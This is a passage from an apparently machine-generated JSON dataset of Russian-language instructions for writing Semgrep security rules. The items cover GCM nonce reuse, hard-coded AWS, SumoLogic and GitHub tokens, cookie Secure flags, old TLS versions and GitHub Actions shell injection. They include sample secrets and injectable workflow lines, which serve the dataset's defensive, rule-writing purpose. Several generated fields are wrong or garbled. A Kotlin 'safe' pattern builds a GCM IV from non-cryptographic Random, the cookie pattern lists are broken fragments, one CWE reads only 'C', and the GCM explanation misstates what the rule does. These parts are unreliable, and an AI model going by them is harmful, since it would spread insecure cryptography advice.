длину\n\nОпасные паттерны:\n• val theBadIV: Array<Byte> = BAD_IV.getBytes()\n• val gcmParameterSpec: GCMParameterSpec = GCMParameterSpec(GCM_TAG_LENGTH * 8, theBadIV)\n• val gcmParameterSpec: GCMParameterSpec = GCMParameterSpec(GCM_TAG_LENGTH * 8, BAD_IV2)\n\nБезопасные паттерны:  \n• val gcmParameterSpec: GCMParameterSpec = GCMParameterSpec(GCM_TAG_LENGTH * 8, Random().nextBytes(12))\n• val gcmParameterSpec: GCMParameterSpec = GCMParameterSpec(GCM_TAG_LENGTH * 8, SecureRandom().generateSeed(12))\n\nЛегенда аннотаций:\n- // ruleid:gcm-detection: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:gcm-detection: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: gcm-detection\n  metadata:\n    category: security\n    cwe:\n    - 'CWE-323: Reusing a Nonce, Key Pair in Encryption'\n    references:\n    - https://cwe.mitre.org/data/definitions/323.html\n    technology:\n    - kotlin\n    owasp:\n    - A02:2021 - Cryptographic Failures\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n  languages:\n  - kt\n  # we should probably deprecate this...\n  message: GCM detected, please check that IV/nonce is not reused, an Initialization Vector (IV) is a nonce\n    used to randomize the encryption, so that even if multiple messages with identical plaintext are encrypted,\n    the generated corresponding ciphertexts are different.Unlike the Key, the IV usually does not need\n    to be secret, rather it is important that it is random and unique. Certain encryption schemes the IV\n    is exchanged in public as part of the ciphertext. Reusing same Initialization Vector with the same\n    Key to encrypt multiple plaintext blocks allows an attacker to compare the ciphertexts and then, with\n    some assumptions on the content of the messages, to gain important information about the data being\n    encrypted.\n  patterns:\n  - pattern-either:\n    - pattern: $METHOD.getInstance(\"AES/GCM/NoPadding\",...)\n    - pattern: GCMParameterSpec(...)\n  severity: INFO\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования схемы шифрования Galois/Counter Mode (GCM) с жестко закодированным вектором инициализации (IV). Вектор инициализации является важным элементом безопасности при использовании GCM, так как он должен быть уникальным для каждой операции шифрования. Правило ищет вызовы методов getInstance и GCMParameterSpec, которые могут указывать на возможное неправильное использование IV. Опасным считается случай, когда IV жестко задан или явно передается в метод, поскольку это нарушает принцип уникальности IV.\n\n# Ключевые элементы:\n- ID: gcm-detection\n- Язык: kt \n- Тип: audit\n- Серьезность: INFO",
    "metadata": {
      "rule_id": "gcm-detection",
      "language": "kt",
      "severity": "INFO",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Разработай правило Semgrep для выявления: detected-aws-session-token\nОписание уязвимости: AWS Session Token detected\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: regex",
    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: detected-aws-session-token.txt\n# cf. https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_temp_use-resources.html\n\nexport AWS_ACCESS_KEY_ID=AKIAI44QH8DHBEXAMPLE\nexport AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n# ruleid: detected-aws-session-token\nexport AWS_SESSION_TOKEN=FQoGZXIvYXdzENv//////////wEaDEeLj11xTbnBk6azRCKsAacCiJK85DSXExJ81GtHrkEyev8eedQcFY4EoM00PsD1FAEMOfzQclVEFsoh9Y4ZHUjgGmCPRUnYCLNc2NnHkadvmI+MT7jRRa1Mo2HA/HYStOOwEyfXFYG91MNj9rVXXXXXXXXA6+7FF6jcxj3cr1U9CDB9hjW+jGq4UgjxXXXXXXXCoIidDjl4Z911zIzP/Q+FYA1R2CUz5Y32EUaMzR+bQvmheUolLOq3wU=\naws ec2 describe-instances --region us-west-1\n\n# ok: detected-aws-session-token\nexport AWS_SESSION_TOKEN=SAMPLEIvYXdzENv//////////wEaDEeLj11xTbnBk6azRCKsAacCiJK85DSXExJ81GtHrkEyev8eedQcFY4EoM00PsD1FAEMOfzQclVEFsoh9Y4ZHUjgGmCPRUnYCLNc2NnHkadvmI+MT7jRRa1Mo2HA/HYStOOwEyfXFYG91MNj9rVXXXXXXXXA6+7FF6jcxj3cr1U9CDB9hjW+jGq4UgjxXXXXXXXCoIidDjl4Z911zIzP/Q+FYA1R2CUz5Y32EUaMzR+bQvmheUolLOq3wU=\naws ec2 describe-instances --region us-west-1  # Ограничиваем длину\n\nОпасные паттерны:\n• export AWS_SESSION_TOKEN=FQoGZXIvYXdzENv//////////wEaDEeLj11xTbnBk6azRCKsAacCiJK85DSXExJ81GtHrkEyev8eedQcFY4EoM00PsD1FAEMOfzQclVEFsoh9Y4ZHUjgGmCPRUnYCLNc2NnHkadvmI+MT7jRRa1Mo2HA/HYStOOwEyfXFYG91MNj9rV\n• export AWS_SESSION_TOKEN=anotherSessionToken\n\nБезопасные паттерны:  \n• export AWS_SESSION_TOKEN=SAMPLEIvYXdzENv//////////wEaDEeLj11xTbnBk6azRCKsAacCiJK85DSXExJ81GtHrkEyev8eedQcFY4EoM00PsD1FAEMOfzQclVEFsoh9Y4ZHUjgGmCPRUnYCLNc2NnHkadvmI+MT7jRRa1Mo2HA/HYStOOwEyfXFYG91MNj9rV\n• export AWS_SESSION_TOKEN=testSessionToken\n\nЛегенда аннотаций:\n- // ruleid:detected-aws-session-token: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:detected-aws-session-token: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: detected-aws-session-token\n  patterns:\n    - pattern-regex: ((?i)AWS_SESSION_TOKEN)\\s*(:|=>|=)\\s*(?P<TOKEN>[A-Za-z0-9/+=]{16,})\n    - pattern-not-regex: (?i)example|sample|test|fake\n    - metavariable-analysis:\n        analyzer: entropy\n        metavariable: $TOKEN\n  languages: [regex]\n  message: AWS Session Token detected\n  severity: ERROR\n  metadata:\n    cwe:\n    - 'CWE-798: Use of Hard-coded Credentials'\n    source-rule-url: https://github.com/grab/secret-scanner/blob/master/scanner/signatures/pattern.go\n    category: security\n    technology:\n    - secrets\n    - aws\n    confidence: LOW\n    owasp:\n    - A07:2021 - Identification and Authentication Failures\n    references:\n    - https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: HIGH\n\n\n# Логика правила:\nЭто правило Semgrep использует регулярное выражение для поиска переменной AWS_SESSION_TOKEN в любом регистре (case insensitive). Оно проверяет наличие жестко закодированного значения длиной не менее 16 символов, состоящего из букв, цифр, слэшей и плюсов. Вторая часть паттерна исключает примеры строк, содержащих слова example, sample, test или fake, чтобы избежать ложных срабатываний. Правило также проводит анализ метавариабельной $TOKEN с использованием энтропийного анализатора, чтобы дополнительно убедиться в том, что найденная строка действительно является токеном сессии.\n\n# Ключевые элементы:\n- ID: detected-aws-session-token\n- Язык: regex \n- Тип: audit\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "detected-aws-session-token",
      "language": "regex",
      "severity": "ERROR",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения cookie-missing-secure-flag\nОписание уязвимости: A cookie was detected without setting the 'secure' flag. The 'secure' flag for cookies prevents the client from transmitting the cookie over insecure channels such as HTTP. Set the 'secure' flag by calling '$COOKIE.setSecure(true);'\nCWE: CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute\nТип анализа: search\nЯзык: java",
    "input": "Требования:\n- Язык: java\n- Тип анализа: search\n- CWE: CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: cookie-missing-secure-flag.java\n@Controller\npublic class CookieController {\n\n    @RequestMapping(value = \"/cookie1\", method = \"GET\")\n    public void setCookie(@RequestParam String value, HttpServletResponse response) {\n        Cookie cookie = new Cookie(\"cookie\", value);\n        // ruleid:cookie-missing-secure-flag\n        response.addCookie(cookie);\n    }\n\n    @RequestMapping(value = \"/cookie2\", method = \"GET\")\n    public void setSecureCookie(@RequestParam String value, HttpServletResponse response) {\n        Cookie cookie = new Cookie(\"cookie\", value);\n        // ok:cookie-missing-secure-flag\n        cookie.setSecure(true);\n        response.addCookie(cookie);\n    }\n\n    @RequestMapping(value = \"/cookie3\", method = \"GET\")\n    public void setSecureHttponlyCookie(@RequestParam String value, HttpServletResponse response) {\n        Cookie cookie = new Cookie(\"cookie\", value);\n        // ok:cookie-missing-secure-flag\n        cookie.setSecure(true);\n        cookie.setHttpOnly(true);\n        response.addCookie(cookie);\n    }\n\n    @RequestMapping(value = \"/cookie4\", method = \"GET\")\n    public void explicitDisable(@RequestParam String value, HttpServletResponse response) {\n        Cookie cookie = new Cookie(\"cookie\", value);\n        // ruleid:cookie-missing-secure-flag\n        cookie.setSecure(false);\n        cookie.setHttpOnly(false);\n        response.addCookie(cookie);\n    }\n\n    @RequestMapping(value = \"/cookie5\", method = \"GET\")\n    public void explicitDisable(@RequestParam String value, HttpServletResponse response) {\n\t// ignore cookies created by Spring's ResponseCookie builder, since the interface is different\n\tCookie cookie = ResponseCookie.from(\"name\", \"value\").build();\n        // ok:cookie-missing-secure-flag\n        response.addCookie(cookie);\n    }\n\n    // test case cf. https://github.com/Dreampie/Resty//blob/9ef059c065d1894c79e7d69c150e588a61eb1cd5/resty-common/src/main/java/cn/dreampie/common/http/HttpResponse.java#L69\n    public Response addCookie(St  # Ограничиваем длину\n\nОпасные паттерны:\n• @RequestMapping(value = \\\n• , method = \\\n• )\\n    public void setCookie(@RequestParam String value, HttpServletResponse response) {\\n        Cookie cookie = new Cookie(\\\n\nБезопасные паттерны:  \n• @RequestMapping(value = \\\n• , method = \\\n• )\\n    public void setSecureCookie(@RequestParam String value, HttpServletResponse response) {\\n        Cookie cookie = new Cookie(\\\n\nЛегенда аннотаций:\n- // ruleid:cookie-missing-secure-flag: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:cookie-missing-secure-flag: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: cookie-missing-secure-flag\n  metadata:\n    cwe:\n    - \"CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute\"\n    owasp:\n    - A05:2021 - Security Misconfiguration\n    source-rule-url: https://find-sec-bugs.github.io/bugs.htm#INSECURE_COOKIE\n    asvs:\n      section: 'V3: Session Management Verification Requirements'\n      control_id: 3.4.1 Missing Cookie Attribute\n      control_url: https://github.com/OWASP/ASVS/blob/master/4.0/en/0x12-V3-Session-management.md#v34-cookie-based-session-management\n      version: '4'\n    category: security\n    technology:\n    - java\n    references:\n    - https://owasp.org/Top10/A05_2021-Security_Misconfiguration\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n  message: >-\n    A cookie was detected without setting the 'secure' flag. The 'secure' flag\n    for cookies prevents the client from transmitting the cookie over insecure\n    channels such as HTTP. Set the 'secure' flag by calling '$COOKIE.setSecure(true);'\n  severity: WARNING\n  languages: [java]\n  patterns:\n  - pattern-not-inside: $COOKIE.setValue(\"\"); ...\n  - pattern-either:\n    - pattern: $COOKIE.setSecure(false);\n    - patterns:\n      - pattern-not-inside: $COOKIE.setSecure(...); ...\n      - pattern-not-inside: $COOKIE = ResponseCookie.from(...). ...; ...\n      - pattern: $RESPONSE.addCookie($COOKIE);\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска случаев, когда cookie создается или обновляется без установки флага 'secure'. Анализируется два основных условия: либо явно вызывается метод setSecure(false), либо cookie добавляется без вызова метода setSecure(). Дополнительно исключаются случаи использования ResponseCookie.builder и явной установки флага secure через другие методы.\n\n# Ключевые элементы:\n- ID: cookie-missing-secure-flag\n- Язык: java \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "cookie-missing-secure-flag",
      "language": "java",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Составь правило Semgrep для: sumologic-access-id\nОписание уязвимости: A gitleaks sumologic-access-id was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: regex",
    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: INFO\n\nКонтекст кода:\n// File: sumologic-access-id.go\n// ruleid: sumologic-access-id\nsumologic.accessId = \"su9OL59biWiJu7\" \n// ruleid: sumologic-access-id\nsumologic_access_id = \"sug5XpdpaoxtOH\" \n// ruleid: sumologic-access-id\nexport SUMOLOGIC_ACCESSID=\"suDbJw97o9WVo0\" \n// ruleid: sumologic-access-id\nSUMO_ACCESS_ID = \"suGyI5imvADdvU\" \n// ruleid: sumologic-access-id\nsumo_api_token = \"sumzfh245re6j5\"  # Ограничиваем длину\n\nОпасные паттерны:\n• // ruleid: sumologic-access-id\nsumologic.accessId = \"su9OL59biWiJu7\"\n• // ruleid: sumologic-access-id\nsumologic_access_id = \"sug5XpdpaoxtOH\"\n• // ruleid: sumologic-access-id\nexport SUMOLOGIC_ACCESSID=\"suDbJw97o9WVo0\"\n\nБезопасные паттерны:  \n• sumologic.accessId = getenv(\"SUMOLOGIC_ACCESS_ID\")\n• sumologic_access_id = os.Getenv(\"SUMOLOGIC_ACCESS_ID\")\n• SUMO_ACCESS_ID = os.Getenv(\"SUMO_ACCESS_ID\")\n\nЛегенда аннотаций:\n- // ruleid:sumologic-access-id: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:sumologic-access-id: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: sumologic-access-id\n  message: A gitleaks sumologic-access-id was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\n  languages:\n    - regex\n  severity: INFO\n  metadata:\n      likelihood: LOW\n      impact: MEDIUM\n      confidence: LOW\n      category: security\n      cwe:\n        - \"CWE-798: Use of Hard-coded Credentials\"\n      cwe2021-top25: true\n      cwe2022-top25: true\n      owasp:\n        - A07:2021 - Identification and Authentication Failures\n      references:\n        - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html\n      source-rule-url: https://github.com/zricethezav/gitleaks/tree/master/cmd/generate/config/rules\n      subcategory:\n        - vuln\n      technology:\n        - gitleaks\n  patterns:\n    - pattern-regex: (?i:(?:sumo)(?:[0-9a-z\\-_\\t .]{0,20})(?:[\\s|']|[\\s|\"]){0,3})(?:=|>|:{1,3}=|\\|\\|:|<=|=>|:|\\?=)(?:'|\\\"|\\s|=|\\x60){0,5}(su[a-zA-Z0-9]{12})(?:['|\\\"|\\n|\\r|\\s|\\x60|;]|$)\n\n\n# Логика правила:\nЭто правило Semgrep использует регулярное выражение для поиска жестко закодированных идентификаторов доступа SumoLogic в исходном коде. Регулярное выражение ищет строку, содержащую 'sumo' или 'Sumo', за которой следует произвольная последовательность букв, цифр и специальных символов длиной до 20 символов, после чего идет оператор присваивания или сравнения ('=', ':', '|:', '<=' и др.), а затем значение идентификатора доступа, состоящее ровно из 12 буквенно-цифровых символов. Правило также учитывает различные варианты написания идентификаторов, такие как 'sumologic.accessId', 'SUMOLOGIC_ACCESSID', 'sumo_api_token' и другие.\n\n# Ключевые элементы:\n- ID: sumologic-access-id\n- Язык: regex \n- Тип: vuln\n- Серьезность: INFO",
    "metadata": {
      "rule_id": "sumologic-access-id",
      "language": "regex",
      "severity": "INFO",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения disallow-old-tls-versions\nОписание уязвимости: Detects creations of tls configuration objects with an insecure MinVersion of TLS. These protocols are deprecated due to POODLE, man in the middle attacks, and other vulnerabilities.\nCWE: C\nТип анализа: search\nЯзык: go",
    "input": "Требования:\n- Язык: go\n- Тип анализа: search\n- CWE: C\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: disallow-old-tls-versions.go\npackage main\n\nimport (\n\t\"crypto/tls\"\n\t\"log\"\n\t\"net/http\"\n\t\"net/http/httptest\"\n\t\"os\"\n)\n\nfunc ok1() {\n\t// Dummy test HTTP server for the example with insecure random so output is\n\t// reproducible.\n\tserver := httptest.NewUnstartedServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {}))\n\tserver.TLS = &tls.Config{\n\t\tRand: zeroSource{}, // for example only; don't do this.\n\t}\n\tserver.StartTLS()\n\tdefer server.Close()\n\n\t// Typically the log would go to an open file:\n\t// w, err := os.OpenFile(\"tls-secrets.txt\", os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0600)\n\tw := os.Stdout\n\n\tclient := &http.Client{\n\t\tTransport: &http.Transport{\n            // ok: disallow-old-tls-versions\n\t\t\tTLSClientConfig: &tls.Config{\n\t\t\t\tKeyLogWriter:       w,\n\t\t\t\tMinVersion:         tls.VersionTLS12,\n\t\t\t\tRand:               zeroSource{}, // for reproducible output; don't do this.\n\t\t\t\tInsecureSkipVerify: true,         // test server certificate is not trusted.\n\t\t\t},\n\t\t},\n\t}\n\tresp, err := client.Get(server.URL)\n\tif err != nil {\n\t\tlog.Fatalf(\"Failed to get URL: %v\", err)\n\t}\n\tresp.Body.Close()\n\n\n\tclient_good := &http.Client{\n\t\tTransport: &http.Transport{\n            // ok: disallow-old-tls-versions\n\t\t\tTLSClientConfig: &tls.Config{\n\t\t\t\tKeyLogWriter: w,\n\t\t\t\tMinVersion:         tls.VersionTLS13,\n\t\t\t\tRand:               zeroSource{}, // for reproducible output; don't do this.\n\t\t\t\tInsecureSkipVerify: true,         // test server certificate is not trusted.\n\t\t\t},\n\t\t},\n\t}\n\tresp, err := client.Get(server.URL)\n\tif err != nil {\n\t\tlog.Fatalf(\"Failed to get URL: %v\", err)\n\t}\n\tresp.Body.Close()\n}\n\nfunc ok2() {\n    // ok: disallow-old-tls-versions\n    mTLSConfig := &tls.Config {\n    }\n\n    mTLSConfig.PreferServerCipherSuites = true\n    mTLSConfig.MinVersion = tls.VersionTLS13\n}\n\nfunc bad1() {\n\t// Dummy test HTTP server for the example with insecure random so output is\n\t// reproducible.\n\tserver := httptest.NewUnstartedServer(http.HandlerFunc(func(w http.ResponseWriter, r *ht  # Ограничиваем длину\n\nОпасные паттерны:\n• client := &http.Client{\n\tTransport: &http.Transport{\n\t\tTLSClientConfig: &tls.Config{\n\t\t\tMinVersion: tls.VersionTLS10,\n\t\t}\n\t},\n}\n• mTLSConfig := &tls.Config {\n\tMinVersion: tls.VersionTLS11\n}\n\nБезопасные паттерны:  \n• client := &http.Client{\n\tTransport: &http.Transport{\n\t\tTLSClientConfig: &tls.Config{\n\t\t\tMinVersion: tls.VersionTLS12,\n\t\t}\n\t},\n}\n• mTLSConfig := &tls.Config {\n\tPreferServerCipherSuites: true,\n\tMinVersion: tls.VersionTLS13\n}\n\nЛегенда аннотаций:\n- // ruleid:disallow-old-tls-versions: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:disallow-old-tls-versions: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: disallow-old-tls-versions\n  message: >-\n    Detects creations of tls configuration objects with an insecure MinVersion of TLS.\n    These protocols are deprecated due to POODLE, man in the middle attacks, and other vulnerabilities.\n  severity: WARNING\n  metadata:\n    likelihood: HIGH\n    impact: MEDIUM\n    confidence: HIGH\n    category: security\n    cwe: 'CWE-319: Cleartext Transmission of Sensitive Information'\n    owasp: 'A03:2017 - Sensitive Data Exposure'\n    references:\n    - https://stackoverflow.com/questions/26429751/java-http-clients-and-poodle\n    subcategory:\n    - vuln\n    technology:\n    - go\n    vulnerability: Insecure Transport\n  languages: [go]\n  patterns:\n  - pattern-either:\n    - pattern: |\n        tls.Config{..., MinVersion: $TLS.$VERSION, ...}\n    - pattern: |\n        $CONFIG = &tls.Config{...}\n        ...\n        $CONFIG.MinVersion = $TLS.$VERSION\n  - metavariable-regex:\n      metavariable: $VERSION\n      regex: (VersionTLS10|VersionTLS11|VersionSSL30)\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска создания объектов конфигурации TLS с небезопасным значением MinVersion. Паттерны ищут конструкции, где явно задается значение MinVersion, равное устаревшим версиям TLS, таким как VersionTLS10, VersionTLS11 или VersionSSL30. Правило использует оператор pattern-either для охвата обоих способов инициализации структуры Config: через прямую инициализацию с указанием версии и через последовательную установку свойства MinVersion.\n\n# Ключевые элементы:\n- ID: disallow-old-tls-versions\n- Язык: go \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "disallow-old-tls-versions",
      "language": "go",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: github-app-token\nОписание уязвимости: A gitleaks github-app-token was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: regex",
    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: INFO\n\nКонтекст кода:\n// File: github-app-token.go\n// ruleid: github-app-token\ngithub_api_token = \"ghu_9nsm3v4iy6zywwoqnhm72sjx4dlu6incka43\"  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: github-app-token.go\n// ruleid: github-app-token\ngithub_api_token = \"ghu_9nsm3v4iy6zywwoqnhm72sjx4dlu6incka43\"\n• // File: another-go-file.go\n// ruleid: github-app-token\nvar myToken string = \"ghs_efghijklmnopqrstuvwxyz1234567890\"\n\nБезопасные паттерны:  \n• // File: safe-go-file.go\ngithub_api_token := os.Getenv(\"GH_APP_TOKEN\")\n• // File: secure-go-file.go\nmyToken := getSecureTokenFromVault()\n\nЛегенда аннотаций:\n- // ruleid:github-app-token: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:github-app-token: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: github-app-token\n  message: A gitleaks github-app-token was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\n  languages:\n    - regex\n  severity: INFO\n  metadata:\n      likelihood: LOW\n      impact: MEDIUM\n      confidence: LOW\n      category: security\n      cwe:\n        - \"CWE-798: Use of Hard-coded Credentials\"\n      cwe2021-top25: true\n      cwe2022-top25: true\n      owasp:\n        - A07:2021 - Identification and Authentication Failures\n      references:\n        - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html\n      source-rule-url: https://github.com/zricethezav/gitleaks/tree/master/cmd/generate/config/rules\n      subcategory:\n        - vuln\n      technology:\n        - gitleaks\n  patterns:\n    - pattern-regex: (ghu|ghs)_[0-9a-zA-Z]{36}\n\n\n# Логика правила:\nЭто правило Semgrep использует регулярное выражение для поиска жестко закодированных токенов GitHub App в виде строк, начинающихся с 'ghu_' или 'ghs_' и следующих за ними 36 символов, представляющих собой алфавитно-цифровые символы. Правило применяет поисковый тип анализа и ищет эти шаблоны в любом контексте Go-кода.\n\n# Ключевые элементы:\n- ID: github-app-token\n- Язык: regex \n- Тип: vuln\n- Серьезность: INFO",
    "metadata": {
      "rule_id": "github-app-token",
      "language": "regex",
      "severity": "INFO",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения run-shell-injection\nОписание уязвимости: Using variable interpolation `${...}` with `github` context data in a `run:` step could allow an attacker to inject their own code into the runner. This would allow them to steal secrets and code. `github` context data can have arbitrary user input and should be treated as untrusted. Instead, use an intermediate environment variable with `env:` to store the data and use the environment variable in the `run:` script. Be sure to use double-quotes the environment variable, like this: \"$ENVVAR\".\nCWE: CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\nТип анализа: search\nЯзык: yaml",
    "input": "Требования:\n- Язык: yaml\n- Тип анализа: search\n- CWE: CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: run-shell-injection.test.yaml\n# Push Semgrep Docker Image\nname: docker\n\non:\n  workflow_dispatch:\n    inputs:\n      message_to_print:\n        type: string\n        required: false\n  push:\n    branches:\n      - develop\n  pull_request:\n    paths-ignore:\n      - \"**.md\"\n\njobs:\n  docker-build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v2\n\n      - name: Pull previous image for caching purposes\n        run: |\n          docker pull returntocorp/semgrep:develop || :\n\n      - name: Build semgrep image with default Dockerfile\n        run: docker build -t returntocorp/semgrep:develop .\n\n      - name: Check the semgrep Docker image\n        run: ./scripts/validate-docker-build.sh returntocorp/semgrep:develop\n\n      - name: Login to DockerHub\n        env:\n          DOCKERHUB_USER: ${{ secrets.DOCKER_USERNAME }}\n          DOCKERHUB_PASS: ${{ secrets.DOCKER_PASSWORD }}\n        run: ./.github/docker-login\n\n      - name: Push semgrep image if on develop branch\n        if: github.event_name == 'push' && github.ref == 'refs/heads/develop'\n        run: docker push returntocorp/semgrep:develop\n\n      - name:\n          Push commit hash if PR\n          # Don't run when PR is from a fork\n          # For security, we do not autopush to docker when from PRs\n          # said PRs do not have access to secrets so will fail anyway but\n          # nicer to not have a \"failing\" CI job in the PR so don't even\n          # try if we can detect is coming from a fork\n        if: github.event_name == 'pull_request' && github.event.pull_request.head.repo.full_name == github.repository\n        # ok: run-shell-injection\n        run: |\n          tag=returntocorp/semgrep:${{ github.sha }}\n          docker build -t \"$tag\" .\n          docker push \"$tag\"\n\n        # Extend the semgrep image, changing the entry point to bash and\n        # adding some utilities. This image is meant for internal uses\n        # such as benchmarks.\n      - name: Build and push semgrep-dev image if on   # Ограничиваем длину\n\nОпасные паттерны:\n• run: |\n  echo '${{ github.event.pull_request.title }}'\n• run: |\n  curl -L '${{ github.event.url }}'\n• run: |\n  git clone '${{ github.event.repository.clone_url }}'\n\nБезопасные паттерны:  \n• env:\n  REPOSITORY_URL: '${{ github.event.repository.clone_url }}'\n...\nrun: |\n  git clone '$REPOSITORY_URL'\n• env:\n  ISSUE_TITLE: '${{ github.event.issue.title }}'\n...\nrun: |\n  echo '$ISSUE_TITLE'\n• env:\n  EVENT_URL: '${{ github.event.url }}'\n...\nrun: |\n  curl -L '$EVENT_URL'\n\nЛегенда аннотаций:\n- // ruleid:run-shell-injection: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:run-shell-injection: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: run-shell-injection\n  languages:\n  - yaml\n  message: 'Using variable interpolation `${{...}}` with `github` context data in a `run:` step could\n    allow an attacker to inject their own code into the runner. This would allow them to steal secrets\n    and code. `github` context data can have arbitrary user input and should be treated as untrusted.\n    Instead, use an intermediate environment variable with `env:` to store the data and use the environment\n    variable in the `run:` script. Be sure to use double-quotes the environment variable, like this: \"$ENVVAR\".'\n  metadata:\n    category: security\n    cwe:\n    - \"CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\"\n    owasp:\n    - A01:2017 - Injection\n    - A03:2021 - Injection\n    references:\n    - https://docs.github.com/en/actions/learn-github-actions/security-hardening-for-github-actions#understanding-the-risk-of-script-injections\n    - https://securitylab.github.com/research/github-actions-untrusted-input/\n    technology:\n    - github-actions\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - vuln\n    likelihood: HIGH\n    impact: HIGH\n    confidence: HIGH\n  patterns:\n  - pattern-inside: 'steps: [...]'\n  - pattern-inside: |\n      - run: ...\n        ...\n  - pattern: 'run: $SHELL'\n  - metavariable-pattern:\n      language: generic\n      metavariable: $SHELL\n      patterns:\n      - pattern-either:\n        - pattern: ${{ github.event.issue.title }}\n        - pattern: ${{ github.event.issue.body }}\n        - pattern: ${{ github.event.pull_request.title }}\n        - pattern: ${{ github.event.pull_request.body }}\n        - pattern: ${{ github.event.comment.body }}\n        - pattern: ${{ github.event.review.body }}\n        - pattern: ${{ github.event.review_comment.body }}\n        - pattern: ${{ github.event.pages. ... .page_name}}\n        - pattern: ${{ github.event.head_commit.message }}\n        - pattern: ${{ github.event.head_commit.author.email }}\n        - pattern: ${{ github.event.head_commit.author.name }}\n        - pattern: ${{ github.event.commits ... .author.email }}\n        - pattern: ${{ github.event.commits ... .author.name }}\n        - pattern: ${{ github.event.pull_request.head.ref }}\n        - pattern: ${{ github.event.pull_request.head.label }}\n        - pattern: ${{ github.event.pull_request.head.repo.default_branch }}\n        - pattern: ${{ github.head_ref }}\n        - pattern: ${{ github.event.inputs ... }}\n        - pattern: ${{ github.event.discussion.title }}\n        - pattern: ${{ github.event.discussion.body }}\n        - pattern: ${{ inputs ... }}\n  severity: ERROR\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска 